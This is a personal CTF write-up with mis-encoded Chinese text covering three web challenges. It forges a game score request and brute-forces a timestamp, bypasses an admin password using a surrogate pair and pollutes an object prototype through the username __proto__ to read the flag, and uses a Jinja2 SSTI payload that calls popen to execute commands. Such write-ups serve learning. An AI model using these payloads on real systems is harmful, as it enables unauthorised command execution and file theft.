## web

### dino3d

**å…³é”®ä»£ç **

```java

sn(e, t) {
        e && t && fetch("/check.php", {
            method: "POST",
            headers: {
                "Content-type": "application/x-www-form-urlencoded; charset=UTF-8"
            },
            body: "score=" + parseInt(e).toString() + "&checkCode=" + md5(parseInt(e).toString() + t) + "&tm=" + (+new Date).toString().substring(0, 10)
        }).then(e => e.text()).then(e => alert(e))
    }
```

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled.png)

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%201.png)

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%202.png)

å·²çŸ¥checkCodeçš„è®¡ç®—æ–¹å¼

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%203.png)

æ„é€ 

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%204.png)

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%205.png)

å‘ç°è¿˜æ˜¯ä¸å¯¹å—ï¼Œå¯èƒ½æ˜¯æ—¶é—´æˆ³æœ‰æ ¡éªŒ

ç”Ÿæˆä¸€ä¸ªå­—å…¸ï¼Œçˆ†ç ´

```python
list = "1234567890"
f = open("num.txt", 'a')
for l1 in list:
		for l2 in list:
			for l3 in list: 
				for l4 in list:
					text = "{}{}{}{}\n".format(l1,l2,l3,l4)
					f.write(text)
f.close()
```

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%206.png)

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%207.png)

ä¹Ÿå¯ä»¥ç›´æ¥åœ¨æµè§ˆ1å™¨çš„æ§åˆ¶å°ç”¨function å®šä¹‰snå‡½æ•°ï¼Œç›´æ¥sn(1000000,â€™1000000DASxCBCTF_wElc03eâ€™)

### CBshop

**æºç **

```python
const fs = require('fs');
const express = require('express');
const session = require('express-session');
const bodyParse = require('body-parser');
const app = express();
const PORT = process.env.PORT || 80;
const SECRET = process.env.SECRET || "cybershop_challenge_secret"

const adminUser = {
    username: "admin",
    password: "ğŸ˜€adminğŸ˜€",
    money: 9999
};

app.use(bodyParse.urlencoded({extended: false}));
app.use(express.json());
app.use(session({
    secret: SECRET,  
    saveUninitialized: false,  
    resave: false, 
    cookie: { maxAge: 3600 * 1000 }
}));
app.use(express.static("static"));

app.get('/isLogin', function(req, res) {
    if(req.session.username) {
        return res.json({
            code: 2,
            username: req.session.username,
            money: req.session.money
        });
    }else{
        return res.json({code: 0, msg: 'Please login!'});
    }
});

app.post('/login', function(req, res) {
    let username = req.body.username;
    let password = req.body.password;
    if (typeof username !== 'string' || username === '' || typeof password !== 'string' || password === '') {
        return res.json({code: 4, msg: 'illegal username or password!'})
    }

    if(username === adminUser.username && password === adminUser.password.substring(1,6)) {//only admin need password
        req.session.username = username;
        req.session.money = adminUser.money;
        return res.json({
            code: 1,
            username: username,
            money: req.session.money,
            msg: 'admin login success!'
        });
    }
    req.session.username = username;
    req.session.money = 10;
    return res.json({
        code: 1,
        username: username,
        money: req.session.money,
        msg: `${username} login success!`
    });
});

app.post('/changeUsername', function(req, res) {
    if(!req.session.username) {
        return res.json({
            code: 0,
            msg: 'please login!'
        });
    }
    let username = req.body.username;
    if (typeof username !== 'string' || username === '') {
        return res.json({code: 4, msg: 'illegal username!'})
    }
    req.session.username = username;
    return res.json({
        code: 2,
        username: username,
        money: req.session.money,
        msg: 'Username change success'
    });
});

//è´­ä¹°å•†å“çš„æ¥å£
function buyApi(user, product) {
    let order = {};
    if(!order[user.username]) {
        order[user.username] = {};
    }

    Object.assign(order[user.username], product);

    if(product.id === 1) {             //buy fakeFlag
        if(user.money >= 10) {
            user.money -= 10;
            Object.assign(order, { msg:  fs.readFileSync('/fakeFlag').toString() });
        }else{
            Object.assign(order,{ msg: "you don't have enough money!" });
        }
    }else if(product.id === 2) {        //buy flag
        if(user.money >= 11 && user.token) {  //do u have token?
            if(JSON.stringify(product).includes("flag")) {
                Object.assign(order,{ msg: "hint: go to 'readFileSync'!!!!" });
            }else{
                user.money -= 11;
                Object.assign(order,{ msg: fs.readFileSync(product.name).toString() });
            }
        }else {
            Object.assign(order,{ msg: "nononono!" });
        }
    }else {
        Object.assign(order,{ code: 0, msg: "no such product!" });
    }
    Object.assign(order, { username: user.username, code: 3, money: user.money });
    return order;
}

app.post('/buy', function(req, res) {
    if(!req.session.username) {
        return res.json({
            code: 0,
            msg: 'please login!'
        });
    }
    var user = {
        username: req.session.username,
        money: req.session.money
    };
    var order = buyApi(user, req.body);
    req.session.money = user.money;
    res.json(order);
});

app.get('/logout', function(req, res) {
    req.session.destroy();
    return res.json({
        code: 0,
        msg: 'logout success!'
    });
});

app.listen(PORT, () => {console.log(`APP RUN IN ${PORT}`)});
```

ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ç™»å½•adminåæ˜¯10å—é’±ï¼Œåæ¥çœ‹wpğŸ˜€ç®—ä¸¤ä¸ªå­—ç¬¦ï¼Œåœ¨å¯†ç æ ¡éªŒçš„æ—¶å€™è¦å…ˆæ‰‹åŠ¨æŠŠç¬¦å·Unicodeä¸€ä¸‹

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%208.png)

ç™»å½•çš„æ—¶å€™æ ¡éªŒå°±æ˜¯ç”¨ç¬¬2ä¸ªåˆ°ç¬¬6ä¸ªå­—ç¬¦ï¼Œæ—¢`\uDE00admi` è¿™æ ·å°±èƒ½ç™»å½•æˆåŠŸã€‚

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%209.png)

ç„¶åå°†åå­—æ”¹ä¸º`__proto__` å†ä¹°flagå°±å¯ä»¥äº†

## Text Reverser

ä¸€ä¸ªå€’è¿‡æ¥çš„ssti,åšçš„æ—¶å€™å¿˜è®°è‡ªå·±çš„fuzzå­—å…¸åœ¨å“ªé‡Œäº†ï¼ŒçœŸçŒªå•Š

å¤§æ¦‚ä¸¤ç§åšæ³•ï¼Œä¸€ä¸ªæ˜¯ç›´æ¥printå‡ºæ¥

`{% print [].**class**.**base**.**subclasses**()[132].**init**.**globals**['popen']('nl /f*').read()%}`

è¿™æ˜¯å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œçš„

![Untitled](attachments/åˆ·é¢˜è®°å½•%20f21c2ca430f14785a6c805dbe3406741/2022%209%205c7d9f0b4165465d92828b9e6a817ae4/Untitled%2010.png)

è¿˜æœ‰ä¸€ç§æ˜¯æ€ªé©°çš„ç›²æ³¨

`{% if ***==""%}1{% endif%}`